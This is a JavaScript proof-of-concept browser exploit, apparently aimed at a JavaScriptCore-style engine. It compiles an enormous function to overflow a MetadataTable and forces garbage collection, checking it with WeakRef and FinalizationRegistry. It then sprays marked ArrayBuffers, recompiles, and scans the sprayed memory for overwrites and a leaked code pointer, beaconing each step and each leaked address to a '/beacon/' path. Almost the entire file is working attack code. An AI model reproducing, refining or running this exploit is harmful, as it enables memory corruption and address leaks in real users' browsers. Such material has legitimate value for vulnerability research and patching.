// p318 - MetadataTable double-compile with GC confirmation
// Same as p317 but uses FinalizationRegistry + WeakRef to CONFIRM
// the function objects were collected before proceeding to spray.
// If GC doesn't collect within 15s, reports failure and aborts.
// Beacon prefix: V318-

(function() {
  function B(tag, body) {
    try {
      var u = '/beacon/V318-' + tag + '?t=' + Date.now();
      if (body !== undefined && String(body).length < 2000) {
        var x = new XMLHttpRequest();
        x.open('POST', u, true);
        x.send(String(body));
      } else {
        new Image().src = u;
      }
    } catch (e) {
      try { new Image().src = '/beacon/V318-' + tag; } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT');

  // Phase 1: Compile function_1 (38M op_call -> overflow -> 100112B MetadataTable)
  var N = 38348816;
  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts1 = new Array(nChunks + 3);
  parts1[0] = 'window.__p318fn=function(a){';
  for (var c = 0; c < nChunks; c++) parts1[1 + c] = callChunk;
  parts1[nChunks + 1] = 'a();'.repeat(rem);
  parts1[nChunks + 2] = '};window.__p318ready=1;';

  var blob1 = new Blob(parts1, {type: 'application/javascript'});
  B('BLOB1-' + Math.round(blob1.size / 1048576) + 'MB');
  parts1 = null;
  callChunk = null;

  var sc1 = document.createElement('script');
  var url1 = URL.createObjectURL(blob1);
  blob1 = null;

  sc1.onload = function() {
    if (!window.__p318ready) { B('COMPILE1-FAIL'); return; }
    B('COMPILE1-OK');

    // Phase 2: Set up GC confirmation via FinalizationRegistry
    var fnCollected = false;
    var registry = new FinalizationRegistry(function(tag) {
      B('GC-COLLECTED-' + tag);
      if (tag === 'fn') fnCollected = true;
    });

    // Register the function object for GC notification
    var fnRef = new WeakRef(window.__p318fn);
    registry.register(window.__p318fn, 'fn');

    // Release all references to the CodeBlock chain
    window.__p318fn = null;
    sc1.remove();
    sc1 = null;
    URL.revokeObjectURL(url1);
    url1 = null;

    // GC pressure loop with FinalizationRegistry polling
    var gcAttempt = 0;
    var maxAttempts = 15;

    function tryGC() {
      gcAttempt++;

      // Aggressive GC pressure
      var junk = [];
      for (var i = 0; i < 200; i++) junk.push(new ArrayBuffer(65536));
      junk = null;
      for (var i = 0; i < 100000; i++) var obj = {a: i, b: [i]};

      // Check WeakRef
      var still = fnRef.deref();
      if (!still) {
        B('WEAKREF-CLEARED-AT-' + gcAttempt);
        // WeakRef cleared = JSFunction collected. Wait one more round for
        // FunctionExecutable and CodeBlock cascade
        setTimeout(function() {
          var junk2 = [];
          for (var i = 0; i < 200; i++) junk2.push(new ArrayBuffer(65536));
          junk2 = null;
          for (var i = 0; i < 100000; i++) var obj2 = {a: i, b: [i]};

          setTimeout(function() {
            B('GC-CASCADE-DONE');
            doSprayAndCompile();
          }, 500);
        }, 500);
        return;
      }

      B('GC-ATTEMPT-' + gcAttempt + '-ALIVE');
      if (gcAttempt >= maxAttempts) {
        B('GC-FAILED-STILL-ALIVE');
        // Proceed anyway - maybe conservative GC pinned it but CodeBlock might
        // still have been freed if it's on a different GC root chain
        doSprayAndCompile();
        return;
      }

      setTimeout(tryGC, 1000);
    }

    setTimeout(tryGC, 500);
  };

  sc1.onerror = function() { B('SCRIPT1-ERR'); };
  document.head.appendChild(sc1);
  sc1.src = url1;

  function doSprayAndCompile() {
    // Phase 3: Spray with 200000-byte buffers
    var SPRAY_SZ = 200000;
    var SPRAY_COUNT = 500;
    var MARKER = 0x42;
    var views = new Array(SPRAY_COUNT);
    var liveCount = 0;

    for (var i = 0; i < SPRAY_COUNT; i++) {
      try {
        var ab = new ArrayBuffer(SPRAY_SZ);
        views[i] = new Uint8Array(ab);
        for (var m = 12; m + 4 <= SPRAY_SZ; m += 112) {
          views[i][m] = MARKER;
          views[i][m+1] = MARKER;
          views[i][m+2] = MARKER;
          views[i][m+3] = MARKER;
        }
        liveCount++;
      } catch (e) {
        B('SPRAY-OOM-' + i);
        break;
      }
    }
    B('SPRAY-' + liveCount);

    // Phase 4: Compile function_2 (same 38M calls)
    var parts2 = new Array(nChunks + 3);
    var callChunk2 = 'a();'.repeat(CHUNK);
    parts2[0] = 'window.__p318fn2=function(a){';
    for (var c = 0; c < nChunks; c++) parts2[1 + c] = callChunk2;
    parts2[nChunks + 1] = 'a();'.repeat(rem);
    parts2[nChunks + 2] = '};window.__p318scan=1;';
    callChunk2 = null;

    var blob2 = new Blob(parts2, {type: 'application/javascript'});
    B('BLOB2-' + Math.round(blob2.size / 1048576) + 'MB');
    parts2 = null;

    var sc2 = document.createElement('script');
    var url2 = URL.createObjectURL(blob2);
    blob2 = null;

    sc2.onload = function() {
      if (!window.__p318scan) { B('COMPILE2-FAIL'); return; }
      B('COMPILE2-OK');
      doScan(views, liveCount, SPRAY_SZ);
    };
    sc2.onerror = function() { B('SCRIPT2-ERR'); };
    document.head.appendChild(sc2);
    sc2.src = url2;

    setTimeout(function() {
      if (!window.__p318scan) B('TIMEOUT-NO-COMPILE2');
    }, 90000);
  }

  function doScan(views, count, sz) {
    var hitBufs = 0;
    var leaks = [];
    var firstHitIdx = -1;

    for (var vi = 0; vi < count; vi++) {
      var view = views[vi];
      if (!view || !view.buffer || view.buffer.byteLength !== sz) continue;

      var hasOverwrite = false;
      for (var q = 12; q + 4 <= sz && !hasOverwrite; q += 112) {
        var v = u32(view, q);
        if (v !== 0x42424242 && v !== 0x00000000) hasOverwrite = true;
      }
      if (!hasOverwrite) continue;

      if (firstHitIdx < 0) firstHitIdx = vi;
      hitBufs++;

      if (leaks.length >= 10) continue;

      // Find entry alignment
      var bestBase = -1;
      var bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase++) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= sz; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }

      if (bestBase < 0 || bestHits < 3) {
        B('HIT-B' + vi + '-NOALIGN-best' + bestBase + '-h' + bestHits);
        continue;
      }

      B('HIT-B' + vi + '-BASE' + bestBase + '-HITS' + bestHits);

      // Read m_slowPathCallDestination at base+24 (8 bytes, pointer)
      for (var off = bestBase + 24; off + 8 <= sz; off += 112) {
        var ptr = hex8(view, off);
        if (ptr !== '0000000000000000') {
          leaks.push('B' + vi + '-O' + off + '-P' + ptr);
          break;
        }
      }
    }

    B('RESULT-bufs' + hitBufs + '-leaks' + leaks.length + '-first' + firstHitIdx);

    for (var i = 0; i < leaks.length; i++) {
      B('LEAK-' + i + '-' + leaks[i]);
    }

    if (hitBufs === 0) {
      var intact = 0, zeroed = 0, modified = 0;
      for (var vi = 0; vi < Math.min(200, count); vi++) {
        var view = views[vi];
        if (!view || !view.buffer) continue;
        var v = u32(view, 12);
        if (v === 0x42424242) intact++;
        else if (v === 0x00000000) zeroed++;
        else modified++;
      }
      B('DIAG-I' + intact + '-Z' + zeroed + '-M' + modified);
    }

    B('DONE');
  }

  setTimeout(function() {
    if (!window.__p318ready) B('TIMEOUT-NO-COMPILE1');
  }, 60000);
})();
